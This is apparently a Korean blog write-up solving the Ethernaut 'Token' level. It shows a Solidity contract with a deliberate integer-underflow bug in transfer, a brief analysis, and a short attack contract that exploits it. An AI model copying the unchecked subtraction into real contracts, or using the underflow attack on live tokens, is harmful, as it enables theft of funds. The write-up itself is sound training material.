---
title: "Ethernaut Token"
date : 2026-11-14 00:00:00 +0900
categories: [Blockchain Security, Ethernaut ]
tags: [solidity, smart-contract, access-control, fallback, foundry]
---

## Token

Token 코드 :

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}


 ```

목표는 balances[msg.sender] 의 계좌에 20개의 토큰이 있는데 이 개수를 바꾸면된다.

 ## 분석 

 젤처음에 balances[msg.sender] = totalSupply로 설정하는데 이후 transfer함수에서 balances[msg.sender] - _value >= 0) 검사를 하고 계좌를 더해주는데 uint256에서는 음수가 없다.. 
 
 따라서 그냥 계속 더해주면 값이 바뀐다.

 ##exploit

 ```solidity 
 
 pragma solidity ^0.8.0;

import "../src/Token.sol";

contract TokenAttack{
    
    Token token = Token(0x55a8491E4cb43a519bca0C36528f59A3d7b86e4B);

    function attack() public{
        token.transfer(msg.sender,10);
        token.transfer(msg.sender,10);
        //console.log(token.balanceOf(msg.sender));
    }
}

 
 ```